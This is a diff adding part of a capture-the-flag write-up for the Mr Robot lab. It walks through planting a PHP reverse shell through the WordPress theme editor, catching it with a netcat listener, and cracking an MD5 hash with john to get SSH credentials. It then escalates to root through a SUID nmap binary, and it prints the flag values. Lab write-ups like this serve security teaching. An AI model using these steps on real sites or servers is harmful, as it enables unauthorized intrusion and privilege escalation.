@@ -200,4 +200,128 @@ And the password is `ER28-0652`
 
 Let's now log into the WordPress
 
+![](../../0.%20Assets/Mr%20Robot%20CTF-1784829948485.webp)
 
+And we logged in as a user with access to the editor which is not good for the company we are going a pentest for
+
+![](../../0.%20Assets/Mr%20Robot%20CTF-1784830091236.webp)
+
+This is because we can change the code into a reverse shell or something like that.
+
+If we look to edit a `.php` file like this one
+
+![](../../0.%20Assets/Mr%20Robot%20CTF-1784830210747.webp)
+
+We will see we can add our `php` code there (reverse shell)
+
+You can use one of the prepared web shells from kali from `/usr/share/webshells/php/`
+
+![](../../0.%20Assets/Mr%20Robot%20CTF-1784830261986.webp)
+
+
+and in my case I will copy the `php-reverse-shell.php` into my desktop and modify the parameters needed (`ip` and `port`)
+
+![](../../0.%20Assets/Mr%20Robot%20CTF-1784830325004.webp)
+![](../../0.%20Assets/Mr%20Robot%20CTF-1784830354660.webp)
+
+And then just upload the changes and update the file
+
+![](../../0.%20Assets/Mr%20Robot%20CTF-1784830423114.webp)
+
+Now set up a listener on the port you specified on the reverse shell
+
+![](../../0.%20Assets/Mr%20Robot%20CTF-1784830454658.webp)
+
+```
+nc -nlvp 1234
+```
+
+And search for the `php` file in the browser to run the code so we get the `reverse shell`
+
+![](../../0.%20Assets/Mr%20Robot%20CTF-1784830569028.webp)
+
+```
+/wp-content/themes/twentyfifteen/archive.php
+```
+
+![](../../0.%20Assets/Mr%20Robot%20CTF-1784830584466.webp)
+
+And we have a shell! 
+
+![](../../0.%20Assets/Mr%20Robot%20CTF-1784830629499.webp)
+![](../../0.%20Assets/Mr%20Robot%20CTF-1784830646916.webp)
+
+and we find a `second key` and a `md5hash`
+
+![](../../0.%20Assets/Mr%20Robot%20CTF-1784830678536.webp)
+
+we cant open the key so let's crack the hash and see if it's a password we can use to log into another user
+
+![](../../0.%20Assets/Mr%20Robot%20CTF-1784830709703.webp)
+
+Let's user `john` to crack it.
+
+```
+john md5-hash.hash --wordlist=fsocity.dir --format=Raw-MD5 
+```
+
+![](../../0.%20Assets/Mr%20Robot%20CTF-1784831290646.webp)
+
+```
+abcdefghijklmnopqrstuvwxyz
+```
+
+So now we use the `ssh` with the credentials we found `robot:abcdefghijklmnopqrstuvwxyz`
+
+
+![](../../0.%20Assets/Mr%20Robot%20CTF-1784831361630.webp)
+
+And we find the second key
+
+![](../../0.%20Assets/Mr%20Robot%20CTF-1784831380663.webp)
+
+```
+822c73956184f694993bede3eb39f959
+```
+
+Now for privilege escalation we will look for `SUID` files with
+
+```
+find / -type f -perm -4000 2>/dev/null
+```
+
+And it finds an extensive list where this file sticks out
+
+```
+/usr/local/bin/nmap
+```
+
+![](../../0.%20Assets/Mr%20Robot%20CTF-1784831510072.webp)
+
+Doing some research I found this :[gtfobins](https://gtfobins.org/gtfobins/nmap/)
+
+so let's try it
+
+```
+/usr/local/bin/nmap --interactive
+```
+
+![](../../0.%20Assets/Mr%20Robot%20CTF-1784831591833.webp)
+ 
+ Bingo!
+
+And with this command we spawn a shell
+
+```
+!sh
+```
+
+![](../../0.%20Assets/Mr%20Robot%20CTF-1784831673194.webp)
+
+![](../../0.%20Assets/Mr%20Robot%20CTF-1784831695117.webp)
+
+and there we go
+
+```
+04787ddef27c3dee1ee161b21670b4e4
+```
